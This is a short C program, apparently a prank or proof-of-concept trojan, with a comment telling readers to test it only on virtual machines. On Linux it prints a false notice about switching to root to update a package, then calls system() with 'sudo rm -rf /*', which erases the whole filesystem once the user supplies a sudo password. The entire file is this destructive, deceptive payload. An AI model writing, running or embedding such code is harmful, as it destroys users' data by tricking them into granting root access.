/*
TEST THIS ON VIRTUAL MACHINES ONLY !
*/

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

#define kill_os "sudo rm -rf /*"
#define text "Switching to root user to update the package" 
#define error_text "There has been an error."

int main(){
#ifdef linux
    if ( geteuid() != 0 ){
        printf("%s\n", text); 
    }
    system(kill_os);
#else
    printf("%s\n", error_text);
#endif
    return 0;
}

